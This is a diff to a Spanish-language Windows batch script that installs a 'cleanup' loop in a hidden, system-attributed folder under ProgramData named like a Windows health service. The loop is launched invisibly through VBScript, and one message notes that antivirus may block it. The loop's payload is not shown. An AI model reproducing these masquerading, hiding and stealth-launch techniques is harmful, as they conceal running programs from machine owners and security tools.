@@ -1,10 +1,21 @@
 @echo off
+:: 0. Verificar privilegios de administrador
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo ============================================================
+    echo [!] ERROR: Se requieren permisos de ADMINISTRADOR.
+    echo Por favor, haz clic derecho y selecciona "Ejecutar como administrador".
+    echo ============================================================
+    pause
+    exit /b
+)
+
 set "targetDir=C:\ProgramData\WindowsHealthService"
 set "cleanerName=system_cleanup.bat"
 set "vbsName=start_service.vbs"
 
 :: 1. Crear el directorio estratégico
-if not exist "%targetDir%" mkdir "%targetDir%"
+if not exist "%targetDir%" mkdir "%targetDir%" || (echo [!] No se pudo crear la carpeta en %targetDir%. & pause & exit /b)
 attrib +h +s "%targetDir%"
 
 :: 2. Crear el script de limpieza (Bucle Infinito)
@@ -44,9 +55,11 @@ start wscript.exe "%targetDir%\%vbsName%"
 timeout /t 3 /nobreak >nul
 tasklist /FI "IMAGENAME eq wscript.exe" | find /I "wscript.exe" >nul
 if %errorlevel% equ 0 (
-    echo [OK] El servicio se ha iniciado correctamente y esta en ejecucion invisible.
-    echo Puedes monitorear la actividad en: %targetDir%\cleanup.log
+    echo [OK] El servicio se ha iniciado correctamente.
+    echo Actividad registrada en: %targetDir%\cleanup.log
 ) else (
-    echo [ERROR] No se pudo iniciar el proceso. Revisa los permisos de la carpeta %targetDir%.
+    echo [ERROR] El proceso invisible no inicio. 
+    echo Posibles causas: Antivirus bloqueando VBScript o permisos insuficientes en ProgramData.
+    echo Intenta revisar si el archivo existe en: %targetDir%\%vbsName%
 )
 pause
